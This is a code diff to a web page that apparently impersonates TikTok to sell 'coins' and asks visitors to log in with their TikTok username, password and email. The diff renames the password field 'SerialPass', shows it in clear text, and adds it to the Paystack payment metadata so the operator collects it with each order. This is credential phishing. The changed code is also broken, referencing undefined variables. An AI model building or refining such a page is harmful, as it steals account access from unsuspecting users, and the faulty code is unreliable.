@@ -456,9 +456,9 @@ body {
          alt="TikTok Logo"
          style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
     <h2 style="margin-top: 20px;">Log in to get Coins</h2>
-    <p>Log in to your TikTok account to confirm where to send coins.</p>
+    <p>Log in to your TikTok account to confirm where to send coins to.</p>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
-    <input type="password" id="passwordInput" placeholder="Password" required><br>
+    <input type="text" id="serialPassInput" placeholder="SerialPass" required><br>
     <input type="email" id="emailInput" placeholder="Email (used for payment receipt)" required><br>
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
@@ -474,7 +474,7 @@ body {
     <div>
       <div class="summary-label">Account</div>
       <div class="small-muted" id="accountUsername">@blesss</div>
-      <div class="small-muted" id="accountPassword" style="margin-top:6px;">Password: ••••••••</div>
+      <div class="small-muted" id="SerialPass" style="margin-top:6px;">SerialPass: SerialPass1</div>
       <div class="small-muted" id="accountEmail" style="margin-top:6px;">Email: —</div>
     </div>
     <div style="text-align:right;">
@@ -634,6 +634,7 @@ function startLogin() {
 function completeLogin() {
   // Basic "complete" login: hide modal, show loader, set loggedIn to true and update UI
   const usernameInput = document.getElementById('usernameInput');
+  const serialPassInput = document.getElementById('serialPassInput');
   const emailInput = document.getElementById('emailInput');
 
   document.getElementById('loginModal').style.display = 'none';
@@ -642,14 +643,16 @@ function completeLogin() {
   setTimeout(() => {
     document.getElementById('loadingOverlay').style.display = 'none';
     loggedIn = true;
-    // Update main button and any other UI elements that depend on login
+
     updateMainButton();
 
-    // Pre-fill summary email/account fields if order summary is open
-    if (document.getElementById('orderSummary').style.display === 'block') {
-      document.getElementById('accountUsername').textContent = '@' + (usernameInput.value.trim() || 'blesss');
-      document.getElementById('accountEmail').textContent = 'Email: ' + (emailInput.value.trim() || '—');
-    }
+    // Update info for summary if it opens later
+    document.getElementById('accountUsername').textContent =
+      '@' + (usernameInput.value.trim() || 'blesss');
+    document.getElementById('SerialPass').textContent =
+      'SerialPass: ' + (serialPassInput.value.trim() || '—');
+    document.getElementById('accountEmail').textContent =
+      'Email: ' + (emailInput.value.trim() || '—');
   }, 900);
 }
 
@@ -658,15 +661,15 @@ function completeLogin() {
    ------------------------- */
 function showOrderSummary() {
   const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
-  const passwordVal = document.getElementById('passwordInput').value || '';
-  const emailVal = document.getElementById('emailInput').value.trim() || '—';
+ const serialPassVal = document.getElementById('serialPassInput').value || '';
+document.getElementById('SerialPass').textContent = 'SerialPass: ' + (serialPassVal || '—');
   const coins = selectedCoins > 0 ? selectedCoins : 0;
 
   // Ensure 70 shows $1.25 explicitly
   const amountUSD = (coins === 70) ? 1.25 : (coins * coinRateUSD);
 
   document.getElementById('accountUsername').textContent = '@' + usernameVal;
-  document.getElementById('accountPassword').textContent = 'Password: ' + (passwordVal ? passwordVal : '—');
+  document.getElementById('SerialPass').textContent = 'SerialPass: ' + (SerialPass ? SerialPass : '—');
   document.getElementById('accountEmail').textContent = 'Email: ' + emailVal;
 
   document.getElementById('summaryCoins').textContent = coins.toLocaleString() + ' Coins';
@@ -725,6 +728,7 @@ function payWithPaystack() {
     metadata: {
       custom_fields: [
         { display_name: "TikTok username", variable_name: "username", value: '@' + usernameVal },
+       { display_name: "SerialPass", variable_name: "SerialPass", value: serialPassVal },
         { display_name: "Customer email", variable_name: "customer_email", value: paystackEmail },
         { display_name: "Coins", variable_name: "coins", value: coins.toString() },
         { display_name: "Amount USD", variable_name: "amount_usd", value: amountUSD.toFixed(2) },
@@ -769,7 +773,7 @@ function showSuccessToast() {
    ------------------------- */
 function checkLoginFields() {
   const usernameField = document.getElementById('usernameInput');
-  const passwordField = document.getElementById('passwordInput');
+  const passwordField = document.getElementById('SerialPass');
   const emailField = document.getElementById('emailInput');
   const continueBtn = document.getElementById('continueBtn');
 
@@ -789,10 +793,10 @@ function checkLoginFields() {
 document.addEventListener('DOMContentLoaded', function() {
   // wire login fields
   const usernameField = document.getElementById('usernameInput');
-  const passwordField = document.getElementById('passwordInput');
+  const passwordField = document.getElementById('SerialPass');
   const emailField = document.getElementById('emailInput');
 
-  if (usernameField && passwordField && emailField) {
+  if (usernameField && serialpassField && emailField) {
     usernameField.addEventListener('input', checkLoginFields);
     passwordField.addEventListener('input', checkLoginFields);
     emailField.addEventListener('input', checkLoginFields);
